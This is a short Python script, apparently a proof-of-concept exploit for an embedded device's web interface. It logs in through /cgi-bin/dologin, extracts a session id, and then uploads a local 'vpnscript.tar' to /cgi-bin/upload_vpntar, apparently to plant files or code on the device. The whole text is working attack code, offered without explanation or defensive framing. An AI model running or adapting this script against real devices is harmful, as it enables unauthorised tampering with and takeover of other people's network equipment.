import requests
import argparse
import sys
import re
import json

top_parser = argparse.ArgumentParser(description='lol')
top_parser.add_argument('-i', '--ip', action="store", dest="ip", required=True, help="The IPv4 address to connect to")
top_parser.add_argument('-p', '--port', action="store", dest="port", type=int, help="The port to connect to", default="80")
top_parser.add_argument('-u', '--username', action="store", dest="username", help="The user to login as", default="admin")
top_parser.add_argument('--pass', action="store", dest="password", required=True, help="The password to use")
args = top_parser.parse_args()

url = 'http://' + args.ip + ':' + str(args.port) + '/cgi-bin/dologin'
print('[+] Logging in via', url)
headers = {'Origin' : 'http://' + args.ip + ':' + str(args.port), 'Referer' : 'http://' + args.ip  + str(args.port)}
r = requests.post(url, headers=headers, data={'username': args.username,'password': args.password})
sid_regex = re.search("\"sid\": \"([0-9a-f]+)\"", r.text)
if sid_regex == None:
    print('[-] Failed to extract the sid.')
    sys.exit(0)

sid = sid_regex.group(1)
print('[+] Logged in. sid:', sid)
url = 'http://' + args.ip + ':' + str(args.port) + '/cgi-bin/upload_vpntar'
print('[+] Uploading the tar')
files = dict(file=('vpnscript', open('vpnscript.tar', 'rb')), fname=(None, 'C:\\fakepath\\test'), sid=(None,sid))
r = requests.post(url, files=files)

result = json.loads(r.text)
if result["body"] == "0":
    print('[+] Success!')
else:
    print('[-] Failure!', r.text)